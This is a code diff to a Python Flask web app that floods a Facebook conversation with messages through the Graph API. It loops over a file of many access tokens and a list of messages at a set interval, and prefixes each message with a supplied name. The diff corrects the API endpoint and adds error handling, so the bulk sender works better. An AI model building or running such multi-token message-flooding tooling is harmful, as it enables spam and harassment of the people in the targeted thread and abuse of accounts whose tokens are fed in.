@@ -17,7 +17,7 @@ headers = {
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
+    'referer': 'https://www.google.com'
 }
 
 stop_events = {}
@@ -30,43 +30,39 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
             if stop_event.is_set():
                 break
             for access_token in access_tokens:
-                api_url = f'https://graph.facebook.com/v17.0/t_{thread_id}/'
+                api_url = f'https://graph.facebook.com/v17.0/t_{thread_id}/messages'
                 message = str(mn) + ' ' + message1
                 parameters = {'access_token': access_token, 'message': message}
-                response = requests.post(api_url, data=parameters, headers=headers)
-                if response.status_code == 200:
-                    print(f"Message Sent Successfully From token {access_token}: {message}")
-                else:
-                    print(f"Message Sent Failed From token {access_token}: {message}")
+                try:
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
+                        print(f"Message Sent Successfully From token {access_token}: {message}")
+                    else:
+                        print(f"Message Sent Failed From token {access_token}: {message}")
+                except Exception as e:
+                    print(f"Error: {e}")
                 time.sleep(time_interval)
 
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
         token_option = request.form.get('tokenOption')
-
         if token_option == 'single':
             access_tokens = [request.form.get('singleToken')]
         else:
             token_file = request.files['tokenFile']
             access_tokens = token_file.read().decode().strip().splitlines()
-
         thread_id = request.form.get('threadId')
         mn = request.form.get('kidx')
         time_interval = int(request.form.get('time'))
-
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
-
         task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
-
         stop_events[task_id] = Event()
         thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
         threads[task_id] = thread
         thread.start()
-
         return f'Task started with ID: {task_id}'
-
     return render_template_string('''
 <!DOCTYPE html>
 <html lang="en">
